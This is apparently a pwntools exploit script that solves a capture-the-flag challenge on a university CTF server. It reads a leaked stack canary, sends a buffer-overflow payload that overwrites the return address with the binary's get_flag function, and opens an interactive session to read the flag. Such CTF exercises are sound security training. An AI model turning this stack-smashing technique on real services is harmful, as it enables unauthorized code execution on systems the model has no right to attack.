#!/usr/bin/env python
from pwn import *
from re import findall

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10201

context.arch = "i386"
context.os = "linux"

e = ELF("bin")
PADD = b'X' * 64
CANPADD = b'X' * 12
GETFLAG = p32(e.symbols["get_flag"])

s = remote(SERVER, PORT)

CAN = p32(int(findall(r"0x[^\']+", s.recvline())[0], 16))

s.sendline(PADD + CAN + CANPADD + GETFLAG)
s.clean()
s.interactive() # cat /home/ctf/flag
s.close()
